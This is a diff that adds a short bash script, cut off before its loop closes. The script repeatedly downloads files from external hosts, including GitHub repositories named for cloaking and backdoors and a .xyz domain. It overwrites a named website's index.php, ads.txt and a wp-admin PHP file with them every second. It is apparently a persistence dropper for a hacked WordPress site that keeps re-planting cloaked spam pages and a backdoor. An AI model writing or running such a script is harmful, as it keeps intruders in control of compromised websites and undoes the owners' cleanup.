@@ -1,0 +1,23 @@
+#!/bin/bash
+
+FILES=(
+"/var/www/vhosts/bobletea.com/httpdocs/index.php"
+"//var/www/vhosts/bobletea.com/httpdocs/ads.txt"
+"/var/www/vhosts/bobletea.com/httpdocs//wp-admin/edit-form-post.php"
+)
+
+URLS=(
+"https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/bobletea"
+"https://jalurpintas.xyz/abastoto/bobletea.txt"
+"https://raw.githubusercontent.com/flux-lab/backdors/refs/heads/main/gecko"
+)
+
+while true
+do
+
+for i in ${!FILES[@]}
+do
+curl -s "${URLS[$i]}" -o "${FILES[$i]}"
+done
+
+sleep 1
